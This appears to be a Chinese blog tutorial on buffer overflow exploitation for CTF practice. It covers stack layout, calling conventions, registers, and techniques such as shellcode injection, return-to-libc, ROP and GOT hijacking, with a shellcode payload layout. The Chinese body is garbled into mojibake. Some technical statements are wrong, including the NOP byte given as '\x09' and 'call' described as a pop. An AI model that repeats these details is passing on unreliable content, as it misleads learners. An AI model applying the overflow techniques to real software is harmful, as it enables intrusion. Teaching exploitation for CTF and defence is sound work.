<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>huzai9527&#39;s personal blog</title>
  
  

  
  <link rel="alternate" href="/atom.xml" title="huzai9527's personal blog">
  

  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <!-- meta -->
  

  <!-- link -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.6.3/css/all.min.css">
  

  
  <link rel="shortcut icon" type="image/x-icon" href="https://xaoxuu.com/assets/img/favicon.ico">
  

  
    <link rel="stylesheet" href="/style.css">
  

  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>

  
  
</head>

<body>
  
  
  <header class="l_header material">
  <div id="loading-bar-wrapper">
    <div id="loading-bar" class="material"></div>
  </div>

	<div class="wrapper">
		<div class="nav-main container container--flex">
      <a class="logo flat-box" href="/">
        
          huzai9527's personal blog
        
      </a>
			<div class="menu navgation">
				<ul class="h-list">
          
  					
  						<li>
								<a class="nav flat-box" href="/" id="home">
									<i class="fas fa-grin fa-fw"></i>&nbsp;è¿‘æœŸæ–‡ç« 
								</a>
							</li>
      			
  						<li>
								<a class="nav flat-box" href="https://github.com/huzai9527?tab=repositories" rel="nofollow" id="https:github.comhuzai9527?tab=repositories">
									<i class="fas fa-folder-open fa-fw"></i>&nbsp;é¡¹ç›®
								</a>
							</li>
      			
  						<li>
								<a class="nav flat-box" href="/archives/" rel="nofollow" id="archives">
									<i class="fas fa-archive fa-fw"></i>&nbsp;å½’æ¡£
								</a>
							</li>
      			
  						<li>
								<a class="nav flat-box" href="https://xaoxuu.com/wiki/volantis/" rel="nofollow" id="https:xaoxuu.comwikivolantis">
									<i class="fas fa-info-circle fa-fw"></i>&nbsp;å…³äºå°ç«™
								</a>
							</li>
      			
      		
				</ul>
			</div>

			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="æœç´¢">
						<i class="icon fas fa-search fa-fw"></i>
					</form>
				</div>
			
			<ul class="switcher h-list">
				
					<li class="s-search"><a class="fas fa-search fa-fw" href="javascript:void(0)"></a></li>
				
				<li class="s-menu"><a class="fas fa-bars fa-fw" href="javascript:void(0)"></a></li>
			</ul>
		</div>

		<div class="nav-sub container container--flex">
			<a class="logo flat-box"></a>
			<ul class="switcher h-list">
				<li class="s-comment"><a class="flat-btn fas fa-comments fa-fw" href="javascript:void(0)"></a></li>
        
          <li class="s-toc"><a class="flat-btn fas fa-list fa-fw" href="javascript:void(0)"></a></li>
        
			</ul>
		</div>
	</div>
</header>
	<aside class="menu-phone">
    <header>
		<nav class="menu navgation">
      <ul>
        
          
            <li>
							<a class="nav flat-box" href="/" id="home">
								<i class="fas fa-clock fa-fw"></i>&nbsp;è¿‘æœŸæ–‡ç« 
							</a>
            </li>
          
            <li>
							<a class="nav flat-box" href="/categories/" rel="nofollow" id="categories">
								<i class="fas fa-archive fa-fw"></i>&nbsp;åˆ†ç±»
							</a>
            </li>
          
            <li>
							<a class="nav flat-box" href="/archives/" rel="nofollow" id="archives">
								<i class="fas fa-archive fa-fw"></i>&nbsp;å½’æ¡£
							</a>
            </li>
          
            <li>
							<a class="nav flat-box" href="/about/" rel="nofollow" id="about">
								<i class="fas fa-info-circle fa-fw"></i>&nbsp;å…³äºå°ç«™
							</a>
            </li>
          
       
      </ul>
		</nav>
    </header>
	</aside>
<script>setLoadingBarProgress(40);</script>



  <div class="l_body nocover">
    <div class='body-wrapper'>
      <div class="l_main">
  
  <section class="post-list">
    
      
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      
    
    
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/">
      PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-12-12</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      <h2 id="ä¸‰ã€ç¼“å†²åŒºæº¢å‡ºåŸç†"><a href="#ä¸‰ã€ç¼“å†²åŒºæº¢å‡ºåŸç†" class="headerlink" title="ä¸‰ã€ç¼“å†²åŒºæº¢å‡ºåŸç†"></a>ä¸‰ã€ç¼“å†²åŒºæº¢å‡ºåŸç†</h2><h3 id="1-ç¨‹åºå†…å­˜å¸ƒå±€"><a href="#1-ç¨‹åºå†…å­˜å¸ƒå±€" class="headerlink" title="1.ç¨‹åºå†…å­˜å¸ƒå±€"></a>1.ç¨‹åºå†…å­˜å¸ƒå±€</h3><ul>
<li><p>åœ¨ç¨‹åºè¿è¡Œçš„ç”Ÿå‘½å‘¨æœŸä¸­,å†…å­˜ä¸­æ¯”è¾ƒé‡è¦çš„å››éƒ¨åˆ†æ•°æ®æ˜¯ç¨‹åºæ•°æ®ã€å †ã€åº“æ•°æ®ã€æ ˆ.æ­¤å¤–å†…æ ¸ç©ºé—´ä¹Ÿä¼šæ˜ å°„åˆ°ç¨‹åºçš„å†…å­˜ä¸­.</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116110155289.png" alt=""></p>
</li>
</ul>
<ul>
<li>ç¨‹åºæ•°æ®(Proc)<ul>
<li>ä»£ç æ®µ(Text seg)<pre><code>- ä¸»è¦å­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶çš„ä»£ç æŒ‡ä»¤,æ˜¯å¯æ‰§è¡Œç¨‹åºåœ¨å†…å­˜ä¸­çš„é•œåƒ,ä»£ç æ®µä¸€èˆ¬æ˜¯åªè¯»çš„
</code></pre><ul>
<li>æ•°æ®æ®µ(Data seg)</li>
<li>å­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶ä¸­å·²ç»åˆå§‹åŒ–çš„å˜é‡,åŒ…æ‹¬é™æ€åˆ†é…çš„å˜é‡å’Œå…¨å±€å˜é‡</li>
<li>BSS seg</li>
<li>åŒ…å«ç¨‹åºä¸­æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡,åœ¨å†…å­˜ä¸­bss æ®µå…¨éƒ¨ç½®0</li>
<li>å †(HEAP)</li>
<li>å­˜æ”¾è¿›ç¨‹è¿è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€ç”³è¯·çš„å†…å­˜æ®µ.è¿›ç¨‹è°ƒç”¨mallocã€allocaã€newç­‰å‡½æ•°æ¥ç”³è¯·å†…å­˜,åˆ©ç”¨freeã€deleteå‡½æ•°é‡Šæ”¾å†…å­˜.è¿™éƒ¨åˆ†å¤§å°ä¸å›ºå®š,ä»¥æ–¹ä¾¿ç¨‹åºçµæ´»ä½¿ç”¨å†…å­˜.</li>
<li>åº“æ•°æ®(Memory Mapping)</li>
<li>å­˜æ”¾æ˜ å°„çš„ç³»ç»Ÿåº“æ–‡ä»¶,å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯libcåº“,å¾ˆå¤šçš„ç¨‹åºæ‰€ä½¿ç”¨çš„ç³»ç»Ÿå‡½æ•°éƒ½ä¼šåŠ¨æ€çš„è¿æ¥åˆ°libcåº“ä¸­</li>
<li>æ ˆ(Stack)</li>
<li>æ ˆå­˜æ”¾ç¨‹åºä¸´æ—¶åˆ›å»ºçš„å±€éƒ¨å˜é‡.åŒ…æ‹¬å‡½æ•°å†…éƒ¨çš„ä¸´æ—¶å˜é‡å’Œè°ƒç”¨å‡½æ•°æ—¶å‹å…¥çš„å‚æ•°.ç”±äº</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-å‡½æ•°è°ƒç”¨æ ˆ"><a href="#1-å‡½æ•°è°ƒç”¨æ ˆ" class="headerlink" title="1. å‡½æ•°è°ƒç”¨æ ˆ"></a>1. <a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">å‡½æ•°è°ƒç”¨æ ˆ</a></h3><ul>
<li><p>æ ˆä»‹ç»</p>
<ul>
<li><p>æ ˆå†…å­˜ä¸€èˆ¬æ ¹æ®å‡½æ•°æ ˆæ¥è¿›è¡Œåˆ’åˆ†,ä¸åŒå‡½æ•°æ ˆä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„,ä»è€Œèƒ½å¤Ÿå®ç°æœ‰æ•ˆçš„å‡½æ•°åˆ‡æ¢</p>
</li>
<li><p>å‡½æ•°æ ˆä¸Šå­˜å‚¨çš„ä¿¡æ¯ä¸€èˆ¬åŒ…æ‹¬</p>
<ul>
<li><p>ä¸´æ—¶å˜é‡ (canary)</p>
</li>
<li><p>å‡½æ•°çš„è¿”å›æ ˆåŸºå€(bp)</p>
</li>
<li><p>å‡½æ•°çš„è¿”å›åœ°å€(ip)</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>å‡½æ•°æ ˆçš„è°ƒç”¨æœºåˆ¶</p>
<ul>
<li><p>ç¨‹åºè¿è¡Œæ—¶,ä¸ºäº†å®ç°å‡½æ•°ä¹‹é—´çš„ç›¸äº’éš”ç¦»,éœ€è¦åœ¨è¿›å…¥æ–°çš„å‡½æ•°ä¹‹å‰ä¿å­˜å½“å‰å‡½æ•°çš„çŠ¶æ€</p>
</li>
<li><p>å‡½æ•°è°ƒç”¨æ—¶,é¦–å…ˆå°†å‚æ•°å‹å…¥æ ˆ,ç„¶åå‹å…¥è¿”å›åœ°å€å’Œæ ˆåº•æŒ‡é’ˆå¯„å­˜å™¨bp,å…¶ä¸­å‹å…¥è¿”å›åœ°å€æ˜¯é€šè¿‡callå®ç°çš„</p>
</li>
<li><p>å‡½æ•°ç»“æŸæ—¶,å°†spé‡æ–°æŒ‡å‘bpä½ç½®,å¹¶å¼¹å‡ºbpå’Œè¿”å›åœ°å€==ip==,é€šå¸¸bpæ˜¯é€šè¿‡leaveæˆ–è€…(pop ebpå®ç°çš„)</p>
</li>
<li><p>å‡½æ•°æ ˆç¤ºæ„å›¾</p>
<ul>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116150123844.png" alt=""></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>- åœ¨å‡½æ•°æ ˆä¸­bpå­˜å‚¨äº†ä¸Šä¸€ä¸ªå‡½æ•°æ ˆçš„åŸºå€,ipå­˜å‚¨çš„æ˜¯è°ƒç”¨å¤„çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®.
- è¿”å›å½“å‰å‡½æ•°æ—¶,ä¼šä»æ ˆä¸Šå¼¹å‡ºè¿™ä¸¤ä¸ªå€¼,ä»è€Œæ¢å¤ä¸Šä¸€ä¸ªå‡½æ•°çš„ä¿¡æ¯
</code></pre><ul>
<li><p>å‡½æ•°å‚æ•°çš„ä¼ é€’</p>
<ul>
<li><p>å‡½æ•°è°ƒç”¨åè®®</p>
<ul>
<li>_stdcall: wimdows APIé»˜è®¤çš„å‡½æ•°è°ƒç”¨åè®®<ul>
<li>å‚æ•°ç”±ç”±å³å‘å·¦å…¥æ ˆ</li>
<li>è°ƒç”¨å‡½æ•°ç»“æŸåç”±è¢«è°ƒç”¨å‡½æ•°æ¥å¹³è¡¡æ ˆ</li>
</ul>
</li>
<li>_cdecl: c++/cé»˜è®¤çš„å‡½æ•°è°ƒç”¨åè®®<ul>
<li>å‚æ•°ç”±å³å‘å·¦å…¥æ ˆ</li>
<li>å‡½æ•°è°ƒç”¨ç»“æŸåç”±å‡½æ•°è°ƒç”¨è€…æ¥å¹³è¡¡æ ˆ</li>
</ul>
</li>
<li>_fastcall:é€‚ç”¨äºå¯¹æ€§èƒ½è¦æ±‚è¾ƒé«˜çš„åœºåˆ<ul>
<li>ä»å·¦å¼€å§‹å°†ä¸å¤§äº4å­—èŠ‚çš„å‚æ•°æ”¾å…¥CPUçš„ecxå’Œedxå¯„å­˜å™¨,å…¶ä½™å‚æ•°ä»å³å‘å·¦å…¥æ ˆ</li>
<li>å‡½æ•°è°ƒç”¨ç»“æŸå,ç”±è¢«è°ƒç”¨è€…æ¥å¹³è¡¡æ ˆ</li>
</ul>
</li>
</ul>
</li>
<li><p>å¯¹äºX86ç¨‹åº</p>
<ul>
<li><p>æ™®é€šå‡½æ•°ä¼ å‚:å‚æ•°åŸºæœ¬éƒ½å‹åœ¨æ ˆä¸Š(ä¹Ÿæœ‰å¯„å­˜å™¨ä¼ å‚çš„æƒ…å†µ)</p>
</li>
<li><p>syscallä¼ å‚: eaxå¯¹åº”ç³»ç»Ÿè°ƒç”¨å·,ebx,ecx,edx,esi,edi,ebpåˆ†åˆ«å¯¹åº”å‰å…­ä¸ªå‚æ•°,å¤šä½™çš„å‚æ•°å‹åœ¨æ ˆä¸Š</p>
</li>
<li><p>==å¯¹äºx86ç¨‹åºè€Œè¨€,å‚æ•°ä¼ é€’æ˜¯é€šè¿‡æ ˆæ¥å®ç°çš„,åœ¨è°ƒç”¨å®Œä»¥å,éœ€è¦æ¸…é™¤æ ˆä¸­å‚æ•°,æ‰€ä»¥ä¸€èˆ¬å‡½æ•°è°ƒç”¨å®Œä¹‹åéœ€è¦ç”¨å½¢å¦‚â€œpop;pop *;,,,,;ret;â€çš„ gadgetæ¥è°ƒæ•´.å› ä¸ºå‡½æ•°è°ƒç”¨æ—¶è¿”å›åœ°å€ä¼šå‹å…¥æ ˆä¸­,æ—¢æ±‡ç¼–ä¸­çš„â€œcall funcâ€æŒ‡ä»¤ç­‰åŒäºâ€œpop ret_addr;jump funcâ€,å› æ­¤åœ¨æ‰§è¡Œjmp funcçš„æ—¶å€™,ret_addrå·²ç»å‹å…¥æ ˆä¸­äº†==</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116160723459.png" alt=""></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>- å°†ret_addræ”¹æˆâ€pop*ï¼›retâ€œæŒ‡ä»¤çš„gadgetï¼Œç”¨æ¥å¼¹å‡ºåç»­çš„argsï¼Œå³æˆä¸ºROPçš„å½¢å¼ï¼Œè¿™ä¹Ÿæ˜¯ROPçš„åŸç†

  ![](CTF-pwn.assets/image-20201116160738116.png)
</code></pre><ul>
<li><p>å¯¹äºX64ç¨‹åº</p>
<ul>
<li><p>æ™®é€šå‡½æ•°ä¼ å‚:å…ˆä½¿ç”¨rdi,rsi,rdx,r8,r9å¯„å­˜å™¨ä½œä¸ºå‡½æ•°å‚æ•°çš„å‰å…­ä¸ªå‚æ•°,å¤šä½™çš„å‚æ•°ä¾æ¬¡å‹åœ¨æ ˆä¸Š</p>
</li>
<li><p>syscallä¼ å‚:raxå¯¹åº”ç³»ç»Ÿè°ƒç”¨å·,ä¼ å‚è§„åˆ™å’Œæ™®é€šå‡½æ•°ä¸€æ ·</p>
</li>
<li><p>å¯¹äºX64çš„ç¨‹åºæ¥è¯´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå‡½æ•°çš„å‚æ•°è¾ƒå°‘ï¼Œé€šå¸¸ç”¨å¯„å­˜å™¨æ¥ä¼ é€’å‚æ•°ï¼Œæ‰€ä»¥åœ¨è¿›å…¥å‡½æ•°ä¹‹å‰ï¼Œå› è¯¥å…ˆå°†å¯„å­˜å™¨è®¾ç½®å¥½</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116161212714.png" alt=""></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>å‡½æ•°è¿è¡Œæ—¶å†…å­˜ä¸­çš„ä¸€æ®µè¿ç»­çš„åŒºåŸŸ,ç”¨æ¥ä¿å­˜å‡½æ•°è¿è¡Œæ—¶çš„çŠ¶æ€ä¿¡æ¯,åŒ…æ‹¬å‚æ•°ä¸å±€éƒ¨å˜é‡</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027195726522.png" alt=""></p>
</li>
</ul>
<ul>
<li><h5 id="æ¶‰åŠçš„å¯„å­˜å™¨"><a href="#æ¶‰åŠçš„å¯„å­˜å™¨" class="headerlink" title="æ¶‰åŠçš„å¯„å­˜å™¨"></a>æ¶‰åŠçš„å¯„å­˜å™¨</h5><ul>
<li><p>æ ˆå¯„å­˜å™¨</p>
<ul>
<li>esp: ç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€,åœ¨å‹æ ˆå’Œé€€æ ˆæ—¶å‘ç”Ÿå˜åŒ–</li>
<li>ebp:ç”¨æ¥å­˜å‚¨å½“å‰å‡½æ•°çŠ¶æ€çš„åŸºåœ°å€,åœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜,å¯ä»¥ç”¨æ¥ç´¢å¼•å‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½®</li>
</ul>
</li>
<li><p>ç‰¹æ®Šå¯„å­˜å™¨</p>
<ul>
<li><p>eip:ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€,cpuæŒ‰ç…§eipçš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œ,eipéšä¹‹æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤,å¦‚æ­¤åå¤</p>
</li>
<li><p>Eflags:æ ‡è¯†ä½å¯„å­˜å™¨</p>
</li>
<li><p>cs(code segment):å‚¨å­˜ä»£ç æ®µçš„åœ°å€</p>
</li>
<li><p>ds(data segment):å‚¨å­˜æ•°æ®æ®µçš„åœ°å€</p>
</li>
<li><p>ss(stack segment):å‚¨å­˜å‡½æ•°è°ƒç”¨æ ˆçš„åœ°å€</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>ä¸€èˆ¬å¯„å­˜å™¨</p>
<ul>
<li>eax(Accumulate):ç´¯åŠ å¯„å­˜å™¨,ç”¨äºè¿›è¡Œç®—æ•°è¿ç®—,è¿”å›å‡½æ•°ç»“æœ</li>
<li>ebx(Base):åŸºå€å¯„å­˜å™¨,åœ¨å†…å­˜å¯»å€æ—¶(æ¯”å¦‚æ•°ç»„è¿ç®—),å­˜æ”¾åŸºåœ°å€</li>
<li>ecx(Count):è®¡æ•°å¯„å­˜å™¨,ç”¨ä»¥åœ¨å¾ªç¯ä¸­è®¡æ•°</li>
<li>edx(Data):æ•°æ®å¯„å­˜å™¨,é€šå¸¸é…åˆeaxå­˜æ”¾è¿ç®—ç»“æœç­‰æ•°æ®</li>
</ul>
</li>
<li><p>ç´¢å¼•å¯„å­˜å™¨</p>
<ul>
<li>esi(Souce Index):æŒ‡å‘è¦å¤„ç†æ•°æ®çš„åœ°å€</li>
<li>edi(Destination Index): æŒ‡å‘å­˜æ”¾æ•°æ®ç»“æœçš„åœ°å€</li>
</ul>
</li>
</ul>
<ul>
<li><p>æ¶‰åŠçš„æ±‡ç¼–æŒ‡ä»¤</p>
<ul>
<li>MOV DST,SRC; (æ•°æ®ä¼ è¾“æŒ‡ä»¤) å°†srcä¸­çš„æ•°æ®ä¼ è¾“åˆ°dstä¸­</li>
<li>PUSH SRC; (å‹å…¥å †æ ˆæŒ‡ä»¤)å°†SRCå‹å…¥æ ˆ</li>
<li>POP DST;(å¼¹å‡ºå †æ ˆæŒ‡ä»¤) å¼¹å‡ºå †æ ˆæŒ‡ä»¤,å°†æ ˆé¡¶çš„æ•°æ®å¼¹å‡ºå¹¶ä¿å­˜è‡³DST</li>
<li>LEA REG,MEM; (å–åœ°å€æŒ‡ä»¤)å°†MEMçš„åœ°å€å­˜åœ¨REGä¸­</li>
<li>ADD/SUB DST,SRC;(åŠ å‡æŒ‡ä»¤)</li>
<li>CALL PTR;(è°ƒç”¨æŒ‡ä»¤ )å°†å½“å‰çš„eipå‹å…¥æ ˆé¡¶,å¹¶å°†PTRå­˜å…¥eip</li>
<li>RET ;(è¿”å›æŒ‡ä»¤)å°†æ ˆé¡¶æ•°æ®å¼¹å‡ºè‡³eip</li>
</ul>
</li>
<li><p>è°ƒç”¨å‡½æ•°æ—¶,æ ˆçš„å˜åŒ–(å¦‚ä½•æŠ›å¼ƒè¢«è°ƒç”¨å‡½æ•°çš„çŠ¶æ€)</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201145127.png" alt=""></p>
</li>
</ul>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201543440.png" alt=""></p>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201451467.png" alt=""></p>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201645337.png" alt=""></p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201738540.png" alt=""></p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201912962.png" alt=""></p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027202008746.png" alt=""></p>
<h3 id="2-æŠ€æœ¯æ¸…å•"><a href="#2-æŠ€æœ¯æ¸…å•" class="headerlink" title="2.æŠ€æœ¯æ¸…å•"></a>2.æŠ€æœ¯æ¸…å•</h3><ul>
<li><p>è¦†ç›–ç¼“å†²åŒºçš„å…·ä½“ç”¨é€”</p>
<ul>
<li><p>è¦†ç›–å½“å‰æ ˆä¸­å‡½æ•°çš„è¿”å›åœ°å€ï¼ˆå½“å‰å‡½æ•°æˆ–è€…ä¹‹å‰çš„å‡½æ•°ï¼‰ï¼Œè·å–æ§åˆ¶æµ</p>
</li>
<li><p>è¦†ç›–æ ˆä¸­æ‰€å­˜å‚¨çš„ä¸´æ—¶å˜é‡</p>
</li>
<li><p>è¦†ç›–æ ˆåº•å¯„å­˜å™¨bpï¼ˆä¹‹å‰çš„å‡½æ•°ï¼‰</p>
<ul>
<li><p>è¦†ç›–bpå®ç°æ ˆè½¬ç§»</p>
<ul>
<li><p>è¿™ç§æƒ…å†µä¸»è¦é’ˆå¯¹â€œleaveï¼›retâ€æŒ‡ä»¤ï¼›è¯¥æŒ‡ä»¤ç­‰ä»·äºâ€œmov sp,bp;pop bp;retâ€</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116162151945.png" alt=""></p>
</li>
</ul>
</li>
<li><p>è¦†ç›–bpï¼Œå®ç°å‚æ•°ç´¢å¼•æ”¹å˜</p>
<ul>
<li>ä¸€èˆ¬æ¥è¯´ï¼Œå¾ˆå¤šä¸´æ—¶å˜é‡çš„ç´¢å¼•ï¼Œéƒ½æ˜¯æ ¹æ®ç›¸å¯¹äºbpçš„åç§»é‡æ¥è¿›è¡Œçš„ï¼Œå¦‚æœbpå‘ç”Ÿäº†å˜åŒ–ï¼Œé‚£ä¹ˆåç»­çš„å¾ˆå¤šå‚æ•°ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–</li>
</ul>
</li>
</ul>
</li>
<li><p>å…³æ³¨æ•æ„Ÿå‡½æ•°</p>
<ul>
<li>background<ul>
<li>æ§åˆ¶æŒ‡ä»¤æ‰§è¡Œæœ€å…³é”®çš„å¯„å­˜å™¨å°±æ˜¯eip,å› æ­¤æˆ‘ä»¬çš„==<strong>ç›®æ ‡</strong>æ˜¯è®©eipè½½å…¥æ”»å‡»æŒ‡ä»¤çš„åœ°å€==</li>
<li>å¦‚ä½•è®©eipæŒ‡å‘æ”»å‡»æŒ‡ä»¤,</li>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027202257764.png" alt=""></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>list<ul>
<li>ä¿®æ”¹è¿”å›åœ°å€,ä½¿å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤==(shellcode)==</li>
<li>ä¿®æ”¹è¿”å›åœ°å€,ä½¿å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•°==(return2libc==)</li>
<li>ä¿®æ”¹è¿”å›åœ°å€,ä½¿å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸæ®µæŒ‡ä»¤==(ROP)==</li>
<li>ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨çš„å‡½æ•°çš„åœ°å€,è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•°==(hijack GOT)==</li>
</ul>
</li>
</ul>
<h4 id="1-Shellcode-å…³é—­åœ°å€éšæœºåŒ–ä»¥åŠæœ‰å¯æ‰§è¡Œæƒé™"><a href="#1-Shellcode-å…³é—­åœ°å€éšæœºåŒ–ä»¥åŠæœ‰å¯æ‰§è¡Œæƒé™" class="headerlink" title="1.Shellcode(å…³é—­åœ°å€éšæœºåŒ–ä»¥åŠæœ‰å¯æ‰§è¡Œæƒé™)"></a>1.Shellcode(å…³é—­åœ°å€éšæœºåŒ–ä»¥åŠæœ‰å¯æ‰§è¡Œæƒé™)</h4><ul>
<li>payload = padding1 + address of shellcode + padding2 + shellcode</li>
<li><p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027211319900.png" alt=""></p>
</li>
<li><p>padding1 ä¸­çš„æ•°æ®éšä¾¿å¡«å……(âš ï¸å¦‚æœæ˜¯å­—ç¬¦ä¸²è¾“å…¥,é¿å…\x00,å¯èƒ½ä¼šè¢«æˆªæ–­),==é•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€==</p>
<ul>
<li>==é—®é¢˜ä¸€==:padding1å› è¯¥å¤šé•¿?<ul>
<li>å¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·(GDB)æŸ¥çœ‹æ±‡ç¼–ä»£ç æ¥ç¡®å®šè¿™ä¸ªå€¼==ä¸€èˆ¬æ˜¯leaæŒ‡ä»¤+4==</li>
<li>ä¹Ÿå¯ä»¥é€šè¿‡ç¨‹åºä¸æ–­å¢åŠ è¾“å…¥é•¿åº¦æ¥è¯•æ¢(å¦‚æœè¿”å›åœ°å€è¢«æ— æ•ˆåœ°å€å¦‚â€AAAâ€œè¦†ç›–)ç¨‹åºä¼šæŠ¥é”™</li>
</ul>
</li>
</ul>
</li>
<li>address of shellcode æ˜¯åé¢shellcodeå¤„çš„èµ·å§‹å¤„çš„åœ°å€,==ç”¨æ¥è¦†ç›–è¿”å›åœ°å€==<ul>
<li>==é—®é¢˜äºŒ:==shellcode çš„èµ·å§‹åœ°å€æ˜¯å¤šå°‘?<ul>
<li>å¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·æŸ¥çœ‹è¿”å›å€¼çš„åœ°å€(ebpä¸­çš„å†…å®¹+4, 32ä½æœº)</li>
<li>ä½†æ˜¯è°ƒè¯•é‡Œçš„åœ°å€å¯èƒ½å’Œæ­£å¸¸è¿è¡Œæ—¶ä¸ä¸€æ ·,æ­¤æ—¶å°±å¯ä»¥é€šè¿‡åœ¨padding2ä¸­å¡«å……è‹¥å¹²é•¿åº¦çš„==â€œ\x09â€==,æ­¤æœºå™¨ç å¯¹åº”çš„æŒ‡ä»¤æ˜¯NOP(No Operation),æ—¢å‘Šè¯‰cpuå•¥ä¹Ÿä¸ç”¨åš,ç„¶åè·³åˆ°ä¸‹ä¸€æŒ‡ä»¤,æœ‰äº†NOPçš„å¡«å……,åªè¦è¿”å›åœ°å€èƒ½å¤Ÿå‘½ä¸­è¿™ä¸€æ®µä¸­çš„ä»»ä¸€ä½ç½®,éƒ½å¯ä»¥è·³è½¬åˆ°shellcodeçš„èµ·å§‹å¤„</li>
</ul>
</li>
</ul>
</li>
<li>padding2å¯ä»¥éšæ„å¡«å……,é•¿åº¦ä»»æ„.</li>
<li>shellcodeå› è¯¥æ˜¯16è¿›åˆ¶æœºå™¨ç çš„æ ¼å¼</li>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027213551447.png" alt=""></li>
</ul>
